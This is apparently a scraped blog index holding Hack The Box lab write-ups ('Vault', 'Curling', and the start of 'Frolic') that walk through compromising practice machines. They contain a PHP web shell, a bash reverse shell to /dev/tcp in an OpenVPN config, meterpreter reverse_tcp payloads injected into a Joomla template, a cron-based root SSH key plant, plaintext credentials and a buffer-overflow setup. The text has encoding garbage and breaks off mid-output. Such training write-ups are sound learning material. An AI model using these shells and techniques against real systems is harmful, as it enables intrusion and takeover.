4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html; charset=UTF-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb enumerationThere‚Äôs not much on the main page except a mention about SparklaysA gobuster scan with big.txt in the root directory reveals nothing but if we start with /sparklays we find a few directories:# gobuster -q -t 50 -w big.txt -u http://vault.htb -s 200,204,301,302,307# gobuster -q -t 50 -w big.txt -u http://vault.htb/sparklays -s 200,204,301,302,307/design (Status: 301)# gobuster -q -t 50 -w big.txt -u http://vault.htb/sparklays/design -s 200,204,301,302,307/uploads (Status: 301)Further scanning with raft-small-words and .html extension reveals design.html:# gobuster -q -t 50 -w raft-small-words.txt -u http://vault.htb/sparklays/design -x php,html -s 200,204,301,302,307/uploads (Status: 301)/design.html (Status: 200)The link goes to an upload page. Upload pages are interesting because if we can upload a PHP file then we can get RCE on the target machine.I used a simple PHP command shell:&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&lt;?php system($_GET[\"cmd\"]); ?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;When we try to upload a simple PHP command shell we get a sorry that file type is not allowed error message.After trying a few different file types, I noticed we can use the .php5 file extension and we get a The file was uploaded successfully message.We now have RCE:Found a couple of interesting files in Dave‚Äôs desktop folder:http://vault.htb/sparklays/design/uploads/shell.php5?cmd=ls%20-l%20/home/dave/Desktoptotal 12-rw-rw-r-- 1 alex alex 74 Jul 17 10:30 Servers-rw-rw-r-- 1 alex alex 14 Jul 17 10:31 key-rw-rw-r-- 1 alex alex 20 Jul 17 10:31 sshThe ssh file contains plaintext credentials:http://vault.htb/sparklays/design/uploads/shell.php5?cmd=cat%20/home/dave/Desktop/sshdaveDav3therav3123Shell accessUsing the SSH credentials we found in Dave‚Äôs directory we can now log in:root@ragingunicorn:~/hackthebox/Machines/Vault# ssh dave@10.10.10.109dave@10.10.10.109's password:Last login: Sat Nov  3 19:59:05 2018 from 10.10.15.233dave@ubuntu:~$The ~/Desktop directory contains a couple of interesting files:dave@ubuntu:~/Desktop$ ls -ltotal 12-rw-rw-r-- 1 alex alex 14 Jul 17 10:31 key-rw-rw-r-- 1 alex alex 74 Jul 17 10:30 Servers-rw-rw-r-- 1 alex alex 20 Jul 17 10:31 sshdave@ubuntu:~/Desktop$ cat keyitscominghomedave@ubuntu:~/Desktop$ cat ServersDNS + Configurator - 192.168.122.4Firewall - 192.168.122.5The Vault - xdave@ubuntu:~/Desktop$ cat sshdaveDav3therav3123The user also has a gpg keyring:dave@ubuntu:~/.gnupg$ ls -ltotal 28drwx------ 2 dave dave 4096 Jul 17  2018 private-keys-v1.d-rw------- 1 dave dave 2205 Jul 24  2018 pubring.gpg-rw------- 1 dave dave 2205 Jul 24  2018 pubring.gpg~-rw------- 1 dave dave  600 Sep  3  2018 random_seed-rw------- 1 dave dave 4879 Jul 24  2018 secring.gpg-rw------- 1 dave dave 1280 Jul 24  2018 trustdb.gpgBased on the Servers file it seems there are other VMs or containers running. We can confirm this also by checking the network interfaces (there‚Äôs a virtual bridge interface with the same subnet mentionned in the Server file:dave@ubuntu:~/Desktop$ ifconfigens33     Link encap:Ethernet  HWaddr 00:50:56:b2:8d:92          inet addr:10.10.10.109  Bcast:10.10.10.255  Mask:255.255.255.0          inet6 addr: fe80::250:56ff:feb2:8d92/64 Scope:Link          inet6 addr: dead:beef::250:56ff:feb2:8d92/64 Scope:Global          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:484701 errors:0 dropped:0 overruns:0 frame:0          TX packets:372962 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:61423226 (61.4 MB)  TX bytes:123066398 (123.0 MB)virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:34 errors:0 dropped:0 overruns:0 frame:0          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:2296 (2.2 KB)  TX bytes:731 (731.0 B)We can do a poor man‚Äôs port scan using netcat and find the host 192.168.122.4 with two ports open:dave@ubuntu:~/Desktop$ nc -nv 192.168.122.4 -z 1-1000 2&gt;&amp;1 | grep -v failedConnection to 192.168.122.4 22 port [tcp/*] succeeded!Connection to 192.168.122.4 80 port [tcp/*] succeeded!We‚Äôll setup SSH port forwarding so we can get to the 2nd host:root@ragingunicorn:~/hackthebox/Machines/Vault# ssh dave@10.10.10.109 -L 80:192.168.122.4:80dns-config.php is an invalid link (404).The 2nd link brings us to a VPN configuration page where we can update an ovpn file.With gobuster, we find additional information in /notes:# gobuster -q -t 50 -w big.txt -u http://127.0.0.1 -s 200,204,301,302,307/notes (Status: 200)We can grab http://127.0.0.1/123.ovpn:remote 192.168.122.1dev tunnobindscript-security 2up \"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.122.1/2323 0&gt;&amp;1'\"And http://127.0.0.1/script.sh:#!/bin/bashsudo openvpn 123.ovpnSo it seems that the 123.ovpn file contains a reverse shell payload.We can just spawn a netcat on the box and trigger the Test VPN function to get a shell:dave@ubuntu:~$ nc -lvnp 2323Listening on [0.0.0.0] (family 0, port 2323)Connection from [192.168.122.4] port 2323 [tcp/*] accepted (family 2, sport 60596)bash: cannot set terminal process group (1131): Inappropriate ioctl for devicebash: no job control in this shellroot@DNS:/var/www/html# id;hostnameid;hostnameuid=0(root) gid=0(root) groups=0(root)DNSroot@DNS:/var/www/html#User flag found in Dave‚Äôs directory:root@DNS:/home/dave# cat user.txtcat user.txta4947...There‚Äôs also SSH credentials in there:root@DNS:/home/dave# cat sshcat sshdavedav3gerous567Priv EscIn the web directories, there‚Äôs a file that reveals two additional network segments:  192.168.1.0/24  192.168.5.0/24root@DNS:/var/www/DNS# ls -latotal 20drwxrwxr-x 3 root root 4096 Jul 17 12:46 .drwxr-xr-x 4 root root 4096 Jul 17 12:47 ..drwxrwxr-x 2 root root 4096 Jul 17 10:34 desktop-rw-rw-r-- 1 root root  214 Jul 17 10:37 interfaces-rw-rw-r-- 1 root root   27 Jul 17 10:35 visudoroot@DNS:/var/www/DNS# cat visudowww-data ALL=NOPASSWD: ALLroot@DNS:/var/www/DNS# cat interfacesauto ens3iface ens3 inet staticaddress 192.168.122.4netmask 255.255.255.0up route add -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5up route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28There‚Äôs a route in the routing table pointing to the firewall:dave@DNS:~$ netstat -rnKernel IP routing tableDestination     Gateway         Genmask         Flags   MSS Window  irtt Iface192.168.5.0     192.168.122.5   255.255.255.0   UG        0 0          0 ens3192.168.122.0   0.0.0.0         255.255.255.0   U         0 0          0 ens3In the host file we can also find a reference to our next target: 192.168.5.2root@DNS:/home/dave# cat /etc/hostscat /etc/hosts127.0.0.1       localhost127.0.1.1       DNS192.168.5.2     VaultSo, we the network topology looks like this:This network is protected by a firewall, as shown earlier in the Servers file we found. Nmap is already installed on the DNS VM so we can use it to scan 192.168.5.2.root@DNS:~# nmap -P0 -p 1-10000 -T5 192.168.5.2Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-04 03:56 GMTmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for Vault (192.168.5.2)Host is up (0.0019s latency).Not shown: 9998 filtered portsPORT     STATE  SERVICE53/tcp   closed domain4444/tcp closed krb524Nmap done: 1 IP address (1 host up) scanned in 243.36 secondsBy using the 4444 as a source port we can bypass the firewall and find another open port:root@DNS:~# nmap -g 4444 -sS -P0 -p 1-1000 192.168.5.2Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-04 04:16 GMTmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for Vault (192.168.5.2)Host is up (0.0023s latency).Not shown: 999 closed portsPORT    STATE SERVICE987/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 3.84 secondsWe‚Äôll need to SSH in by changing the source port of the TCP socket. To do that we can spawn a ncat listener that redirects to port 987 while changing the source port. Then we just SSH to ourselves on the ncat listening port.root@DNS:~# ncat -l 2222 --sh-exec \"ncat 192.168.5.2 987 -p 4444\"root@DNS:~# ssh -p 2222 dave@127.0.0.1  (password = dav3gerous567)Last login: Mon Sep  3 16:48:00 2018dave@vault:~$ iduid=1001(dave) gid=1001(dave) groups=1001(dave)vault:~$ lsroot.txt.gpgThe only thing interesting is the root.txt.gpgWe can download this back to the host OS and decrypt it with the itscominghome key we found earlier:root@DNS:/var/www/html# ncat -l 2222 --sh-exec \"ncat 192.168.5.2 987 -p 4444\"dave@ubuntu:~$ scp -P 2222 dave@192.168.122.4:~/root.txt.gpg .dave@192.168.122.4's password: root.txt.gpg                                                          100%  629     0.6KB/s   00:00dave@ubuntu:~$ gpg -d root.txt.gpgYou need a passphrase to unlock the secret key foruser: \"david &lt;dave@david.com&gt;\"4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24      \"david &lt;dave@david.com&gt;\"ca468..."
  },
  
  {
    "title": "Curling - Hack The Box",
    "url": "/posts/htb-writeup-curling/",
    "categories": "hackthebox, infosec",
    "tags": "joomla, ctf, cron, php, easy",
    "date": "2019-03-30 00:00:00 +0800",
    





    
    "snippet": "Quick summary  The username for the Joomla site is Floris as indicated on the main page in one of the post  The password is a variant of a word on the main page: Curling2018!  On the Joomla admin p...",
    "content": "Quick summary  The username for the Joomla site is Floris as indicated on the main page in one of the post  The password is a variant of a word on the main page: Curling2018!  On the Joomla admin page we can inject a meterpreter reverse shell in the index.php file of the template in-use  After getting a shell, we can download a password backup file, which is compressed several times, and contains the password for user floris  User floris controls a input file used by curl running in a root cronjob. We can change the config file so that cURL gets our SSH public key and saves it into the root ssh directoryNmapJust a webserver running Joomla on port 80root@ragingunicorn:~/hackthebox/Machines# nmap -sV -sV curling.htbStarting Nmap 7.70 ( https://nmap.org ) at 2018-10-27 16:22 EDTNmap scan report for curling.htb (10.10.10.150)Host is up (0.020s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.29 secondsJoomlaJoomscan didn‚Äôt return anything interesting but the main page has some interesting stuff:      The site name is Cewl Curling site!, this is a reference to the cewl tool used to scrape websites for words which are then used to build wordlists.        The first post reveals the username for the administrator: Floris        The first post also contains something which could be used as a password: curling2018  After trying a few variants of the password, I was able to log in as user Floris with the password Curling2018!We can now access the administrator page at http://curling.htb/administrator/index.phpI generated a simple PHP meterpreter payload:root@ragingunicorn:~/htb/curling# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 &gt; shell.php[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 1112 bytesThen I added it to the index.php page so i could trigger it by browsing the main page:msf exploit(multi/handler) &gt; show optionsModule options (exploit/multi/handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (php/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  tun0             yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard Targetmsf exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 10.10.14.23:4444Getting a shell:[*] Started reverse TCP handler on 10.10.14.23:4444[*] Sending stage (37775 bytes) to 10.10.10.150[*] Meterpreter session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.150:56220) at 2018-10-27 16:33:27 -0400meterpreter &gt; sessions 1[*] Session 1 is already interactive.meterpreter &gt; shellProcess 2047 created.Channel 0 created.iduid=33(www-data) gid=33(www-data) groups=33(www-data)Escalate to user FlorisUser floris has a readable file password_backupcd /home/florislsadmin-areapassword_backupuser.txtcat password_backup00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&amp;SY...H..00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:400000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........400000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..&lt;~.x00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .&gt;...sVT.zH....100000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s.\"000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.000000f0: 819b bb48                                ...HThis appears to be a bzip2 file but we need to put it back in binary format first, we‚Äôll use CyberChef for this:We just hit the Save to output file icon to download the download.dat file in binary format.Confirmed, this is a bzip2 file:root@ragingunicorn:~/Downloads# file download.datdownload.dat: bzip2 compressed data, block size = 900kLet‚Äôs decompress it‚Ä¶root@ragingunicorn:~/Downloads# bzip2 -d download.datbzip2: Can't guess original name for download.dat -- using download.dat.outroot@ragingunicorn:~/Downloads# file download.dat.outdownload.dat.out: gzip compressed data, was \"password\", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141Geez, another compressed file in it!root@ragingunicorn:~/Downloads# mv download.dat.out download.gzroot@ragingunicorn:~/Downloads# gunzip download.gzroot@ragingunicorn:~/Downloads# file downloaddownload: bzip2 compressed data, block size = 900kNow, this is just dumb‚Ä¶root@ragingunicorn:~/Downloads# mv download password.bz2root@ragingunicorn:~/Downloads# bzip2 -d password.bz2root@ragingunicorn:~/Downloads# file passwordpassword: POSIX tar archive (GNU)Let‚Äôs keep going.root@ragingunicorn:~/Downloads# tar xvf password.tarpassword.txtroot@ragingunicorn:~/Downloads# cat password.txt5d&lt;wdCbdZu)|hChXllFinally!We can su to user floris now and get the user flag.python3 -c 'import pty;pty.spawn(\"/bin/sh\")'$ su -l florissu -l florisPassword: 5d&lt;wdCbdZu)|hChXllfloris@curling:~$ cat user.txtcat user.txt65dd1d...floris@curling:~$PrivescFirst, let‚Äôs upload our ssh key so we don‚Äôt have to rely on that meterpreter shell:floris@curling:~$ mkdir .sshmkdir .sshfloris@curling:~$ echo \"ssh-rsa AAAAB...DhscPOtelvd root@ragingunicorn\" &gt; .ssh/authorized_keys&lt;cPOtelvd root@ragingunicorn\" &gt; .ssh/authorized_keysIn admin-area folder, there are two files with a timestamp that keeps refreshing every few minutes:floris@curling:~/admin-area$ ls -latotal 12drwxr-x--- 2 root   floris 4096 May 22 19:04 .drwxr-xr-x 7 floris floris 4096 Oct 27 20:39 ..-rw-rw---- 1 root   floris   25 Oct 27 20:40 input-rw-rw---- 1 root   floris    0 Oct 27 20:40 reportfloris@curling:~/admin-area$ dateSat Oct 27 20:40:44 UTC 2018There is probably a cron job running as root, let‚Äôs confirm this by running a simple ps command in a bash loop:floris@curling:~/admin-area$ while true; do ps waux | grep report | grep -v \"grep --color\"; doneroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportAs suspected, a cronjob executes curl using a input config file which we can write to.We will change the file to fetch our SSH public key and save it into root‚Äôs authorized_keys file:floris@curling:~/admin-area$ echo -ne 'output = \"/root/.ssh/authorized_keys\"\\nurl = \"http://10.10.14.23/key.txt\"\\n' &gt; inputfloris@curling:~/admin-area$ cat inputoutput = \"/root/.ssh/authorized_keys\"url = \"http://10.10.14.23/key.txt\"When the cronjob runs, it fetches our public key:root@ragingunicorn:~/htb/curling# python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 port 80 ...10.10.10.150 - - [27/Oct/2018 16:52:56] \"GET /key.txt HTTP/1.1\" 200 -We can now SSH in as root:root@ragingunicorn:~# ssh root@curling.htbWelcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sat Oct 27 20:47:15 UTC 2018  System load:  0.13              Processes:            181  Usage of /:   46.3% of 9.78GB   Users logged in:      1  Memory usage: 22%               IP address for ens33: 10.10.10.150  Swap usage:   0%  =&gt; There is 1 zombie process.0 packages can be updated.0 updates are security updates.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Tue Sep 25 21:56:22 2018root@curling:~# cat root.txt82c198..."
  },
  
  {
    "title": "Frolic - Hack The Box",
    "url": "/posts/htb-writeup-frolic/",
    "categories": "hackthebox, infosec",
    "tags": "metasploit, esoteric language, ctf, rop, buffer overflow, binary exploitation",
    "date": "2019-03-23 00:00:00 +0800",
    





    
    "snippet": "Frolic had a pretty straightforward user access part where after minimal enumeration we could find the password for the PlaySMS application obfuscated a couple of times with some esoteric languages...",
    "content": "Frolic had a pretty straightforward user access part where after minimal enumeration we could find the password for the PlaySMS application obfuscated a couple of times with some esoteric languages and other things. The PlaySMS application which we could access with the password was directly exploitable from Metasploit without any effort.The priv esc had a buffer overflow in a SUID binary that we had to exploit using a ROP gadget from the libc library. I discovered the very cool one_gadget tool while doing this box.Quick summary  PlaySMS is installed and vulnerable to a bug which we can exploit with Metasploit (needs to be authenticated)  The credentials for PlaySMS are found in an encrypted zip file, which is encoded in Brainfuck, obfuscated in some random directory, then further obfuscated with Ook esoteric programming language  The priv esc is a SUID binary which we can ROP with one_gadget (ASLR is disabled)Tools used  OOK! Language decoder  Brainfuck Language decoder  one_gadgetNmapThe enumeration shows Node-RED, an Nginx server on a non-standard port, Samba and SSH.# Nmap 7.70 scan initiated Sat Oct 13 15:01:02 2018 as: nmap -p- -sC -sV -oA frolic 10.10.10.111Nmap scan report for frolic.htb (10.10.10.111)Host is up (0.018s latency).Not shown: 65530 closed portsPORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)1880/tcp open  http        Node.js (Express middleware)|_http-title: Node-RED9999/tcp open  http        nginx 1.10.3 (Ubuntu)|_http-server-header: nginx/1.10.3 (Ubuntu)|_http-title: Welcome to nginx!Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -1h55m33s, deviation: 3h10m31s, median: -5m33s|_nbstat: NetBIOS name: FROLIC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: frolic|   NetBIOS computer name: FROLIC\\x00|   Domain name: \\x00|   FQDN: frolic|_  System time: 2018-10-14T00:26:00+05:30| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2018-10-13 14:56:00|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Oct 13 15:01:34 2018 -- 1 IP address (1 host up) scanned in 32.59 secondsNode-REDThere‚Äôs a Node-RED server running on port 1880 but when we try to log in with the admin / password credentials it just hangs and times out.Nginx webserverThe default nginx page is shown.Next, we‚Äôll dirbust the site.root@ragingunicorn:~# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://frolic.htb:9999=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://frolic.htb:9999/[+] Threads      : 50[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/big.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 10s=====================================================2018/10/13 15:03:06 Starting gobuster=====================================================/.htpasswd (Status: 403)/.htaccess (Status: 403)/admin (Status: 301)/backup (Status: 301)/dev (Status: 301)/loop (Status: 301)/test (Status: 301)=====================================================2018/10/13 15:03:19 Finished=====================================================The /admin link contains a login form:All the authentication is done client-side with javascript code. Looking at the source code we can see the password: superduperlooperpassword_lolvar attempt = 3; // Variable to count number of attempts.// Below function Executes on click of login button.function validate(){var username = document.getElementById(\"username\").value;var password = document.getElementById(\"password\").value;if ( username == \"admin\" &amp;&amp; password == \"superduperlooperpassword_lol\"){alert (\"Login successfully\");window.location = \"success.html\"; // Redirecting to other page.return false;}else{attempt --;// Decrementing by one.alert(\"You have left \"+attempt+\" attempt;\");// Disabling fields after 3 attempts.if( attempt == 0){document.getElementById(\"username\").disabled = true;document.getElementById(\"password\").disabled = true;document.getElementById(\"submit\").disabled = true;return false;}}}We don‚Äôt even need to log in, we can browse to success.html directly.The page contains some kind of ciphertexthis is actually an esoteric programming language: Ook!We can use dcode.fr to find the plaintext.Nothing here check /asdiSIAJJ0QWE9JASThis contains yet another encoded blob of text:UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA When we base64 decode it, we see the PKZIP magic bytes PK.root@ragingunicorn:~/frolic# base64 -d stuff.b64PK     √â7M#[i   index.phpUT     |[|[ux                                      ^DJsh)root@ragingunicorn:~/frolic# base64 -d stuff.b64 &gt; stuff.zipThe zip file is encrypted, after the first guess I found the password is password:root@ragingunicorn:~/frolic# unzip stuff.zipArchive:  stuff.zip[stuff.zip] index.php password:  inflating: index.phpMore encoded text‚Ä¶root@ragingunicorn:~/frolic# cat index.php4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0aThe following is the Brainfuck esoteric programming language:+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +.--- --.++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.-- ----- .&lt;+++ +[-&gt;+ +++&lt;] &gt;+++. &lt;+++[ -&gt;---&lt;]&gt;-- .&lt;+++ [-&gt;++ +&lt;]&gt;+ .---. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt;++..&lt; Again, we use dcode.fr to find the plaintext:idkwhatispassPlaySMS and shell accessThe http://frolic.htb:9999/dev/backup/ link contains a reference to /playsmsThe playSMS application seems to be installed on the server:We can log in using admin / idkwhatispass.We have two potential vulnerabilities we can use with Metasploit:root@ragingunicorn:~/frolic# searchsploit playsmsPlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)             | exploits/php/remote/44598.rbPlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload             | exploits/php/webapps/42003.txtPlaySMS 1.4 - 'import.php' Remote Code Execution                                               | exploits/php/webapps/42044.txtPlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)         | exploits/php/remote/44599.rbWe can use the playsms_uploadcsv_exec module to get a shell:msf exploit(multi/http/playsms_uploadcsv_exec) &gt; show optionsModule options (exploit/multi/http/playsms_uploadcsv_exec):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   PASSWORD   idkwhatispass    yes       Password to authenticate with   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]   RHOST      10.10.10.111     yes       The target address   RPORT      9999             yes       The target port (TCP)   SSL        false            no        Negotiate SSL/TLS for outgoing connections   TARGETURI  /playsms         yes       Base playsms directory path   USERNAME   admin            yes       Username to authenticate with   VHOST                       no        HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  10.10.14.23      yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   PlaySMS 1.4msf exploit(multi/http/playsms_uploadcsv_exec) &gt; run[*] Started reverse TCP handler on 10.10.14.23:4444[+] Authentication successful: admin:idkwhatispass[*] Sending stage (37775 bytes) to 10.10.10.111[*] Meterpreter session 3 opened (10.10.14.23:4444 -&gt; 10.10.10.111:52952) at 2018-10-13 17:12:46 -0400meterpreter &gt; shellProcess 1785 created.Channel 0 created.whoamiwww-dataFound user flag:cd /homels -ltotal 8drwxr-xr-x 3 ayush ayush 4096 Sep 25 02:00 ayushdrwxr-xr-x 7 sahay sahay 4096 Sep 25 02:45 sahaycd ayushcat user.txt2ab959...Priv escFound our priv esc vector here: /home/ayush/.binary/ropwww-data@frolic:~$ find / -perm /4000 2&gt;/dev/nullfind / -perm /4000 2&gt;/dev/null/sbin/mount.cifs/bin/mount/bin/ping6/bin/fusermount/bin/ping/bin/umount/bin/su/bin/ntfs-3g/home/ayush/.binary/ropThere‚Äôs obviously a buffer overflow in the binary, as shown below:www-data@frolic:~$ /home/ayush/.binary/rop/home/ayush/.binary/rop[*] Usage: program &lt;message&gt;www-data@frolic:~$ /home/ayush/.binary/rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASegmentation fault (core dumped)Luckily, ASLR is disabled on the server (0 = disabled):www-data@frolic:/home/ayush$ cat /proc/sys/kernel/randomize_va_spacecat /proc/sys/kernel/randomize_va_space0We can use netcat to copy the rop binary file to our own box and analyze it with gdb/gef:gef‚û§  checksec[+] checksec for '/root/frolic/rop'Canary                        : NoNX                            : YesPIE                           : NoFortify                       : NoRelRO             